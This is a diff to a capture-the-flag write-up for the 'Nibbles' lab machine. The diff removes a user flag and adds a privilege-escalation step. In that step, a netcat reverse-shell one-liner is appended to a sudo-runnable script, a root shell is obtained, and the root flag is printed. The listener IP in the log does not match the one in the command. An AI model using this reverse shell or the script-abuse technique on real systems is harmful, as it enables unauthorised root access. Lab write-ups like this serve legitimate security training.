@@ -441,8 +441,6 @@ Retrieve user flag:
 
 ```
 nibbler@Nibbles:/home/nibbler$ cat user.txt	
-cat user.txt
-688fef55a59e79dd7bfb5c126386789d
 ```
 
 ***
@@ -667,3 +665,43 @@ User nibbler may run the following commands on Nibbles:
 
 ```
 
+It looks like we can use sudo based on the script results.
+
+If we append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user. Let us edit the `monitor.sh` file to append a reverse shell one-liner.
+
+```
+nibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
+```
+
+The contents appended to the end.&#x20;
+
+Execute the script with sudo, using its full path:
+
+```shell-session
+ nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh 
+```
+
+Catch the root shell on our waiting `nc` listener:
+
+```shell-session
+-[Wed Feb 14-11:14:19]-[table@parrot]-
+-[~]$ nc -lnvp 8443
+listening on [any] 8443 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.75] 41634
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+```
+
+Grab root flag:
+
+```
+root@Nibbles:/# cd root
+cd root
+root@Nibbles:~# ls
+ls
+root.txt
+root@Nibbles:~# cat root.txt
+cat root.txt
+c4e3ffb07d835f8e9e0b892edade5730
+```
